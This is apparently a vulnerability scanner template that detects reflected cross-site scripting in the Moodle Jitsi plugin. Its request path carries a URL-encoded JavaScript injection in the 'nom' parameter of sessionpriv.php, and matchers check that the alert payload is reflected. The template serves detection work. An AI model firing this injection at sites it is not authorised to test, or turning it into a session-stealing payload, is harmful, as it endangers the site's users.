id: moodle-jitsi-plugin-xss
info:
  author: aceseven (digisec360)
  description: Cross-site Scripting in moodle jitsi plugin
  name: Moodle jitsi plugin XSS
  reference: https://github.com/udima-university/moodle-mod_jitsi/issues/67
  severity: medium
  tags: moodle,jitsi,xss,revision
requests:
- matchers:
  - part: body
    type: word
    words:
    - alert(document.domain);
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2F{{Hostname}}%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1'
